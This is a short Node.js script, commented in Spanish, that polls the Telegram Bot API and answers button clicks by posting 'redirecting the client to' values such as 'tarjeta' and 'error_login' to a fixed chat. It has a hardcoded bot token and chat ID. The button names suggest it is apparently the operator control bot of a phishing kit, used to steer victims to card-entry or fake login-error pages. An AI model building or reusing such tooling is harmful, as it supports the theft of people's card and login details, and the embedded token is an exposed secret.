const axios = require('axios');

// Tus credenciales fijas y exactas
const TELEGRAM_CONFIG = {
    TOKEN: "7504360348:AAHwDzXqkikSstpzhuk_R9uMg3XljWTqGM4",
    CHAT_ID: "-1003027102929"
};

const URL_API = `https://api.telegram.org/bot${TELEGRAM_CONFIG.TOKEN}`;
let lastUpdateId = 0;

// Función que procesa los clics
async function procesarBoton(callbackQuery) {
    const data = callbackQuery.data; // Aquí llega: 'tarjeta', 'error_login', etc.

    try {
        // Le avisamos a Telegram que recibimos el clic
        await axios.post(`${URL_API}/answerCallbackQuery`, {
            callback_query_id: callbackQuery.id,
            text: `Comando enviado: ${data.toUpperCase()}`
        });

        // Enviamos la confirmación usando tu CHAT_ID fijo
        await axios.post(`${URL_API}/sendMessage`, {
            chat_id: TELEGRAM_CONFIG.CHAT_ID,
            text: `🎯 *Comando detectado:* Redirigiendo al cliente a: \`${data}\``,
            parse_mode: 'Markdown'
        });
        
        console.log(`[BOT] Botón presionado detectado con éxito: ${data}`);
    } catch (error) {
        console.error("Error al procesar el botón:", error.message);
    }
}

// Escucha activa de comandos
async function iniciarPolling() {
    console.log("🚀 El Bot de Telegram está encendido y escuchando tus comandos...");
    
    while (true) {
        try {
            const respuesta = await axios.get(`${URL_API}/getUpdates`, {
                params: {
                    offset: lastUpdateId + 1,
                    timeout: 30
                }
            });

            const updates = respuesta.data.result;

            if (updates && updates.length > 0) {
                for (const update of updates) {
                    lastUpdateId = update.update_id;

                    if (update.callback_query) {
                        await procesarBoton(update.callback_query);
                    }
                }
            }
        } catch (error) {
            console.error("Error en el ciclo de escucha:", error.message);
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    }
}

iniciarPolling();
